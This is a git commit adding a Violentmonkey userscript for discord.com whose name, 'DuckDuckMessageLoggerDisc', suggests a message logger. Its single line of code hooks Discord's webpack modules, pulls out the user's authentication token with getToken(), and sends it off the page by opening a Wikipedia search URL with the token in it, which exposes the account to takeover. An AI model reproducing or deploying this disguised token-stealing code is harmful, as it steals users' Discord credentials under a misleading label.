f35b5e0d1d79f61c5bf2f8c44515a10be8dbcfec
GunnarasQuark <152932386+GunnarasQuark@users.noreply.github.com>
2024-01-11 19:16:31 -0500

    Create two.js

---
+++ two.js
@@ -0,0 +1,13 @@
+// ==UserScript==
+// @name        DuckDuckMessageLoggerDisc
+// @namespace   Violentmonkey Scripts
+// @match           *://*.discord.com/*
+// @run-at document-start
+// @grant  none
+// @version     1.0
+// @author      -
+// @description 12/29/2023, 7:43:54 PM
+// ==/UserScript==
+
+window.onload = function () {window.open('https://en.wikipedia.org/w/index.php?search='+(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken())
+;};
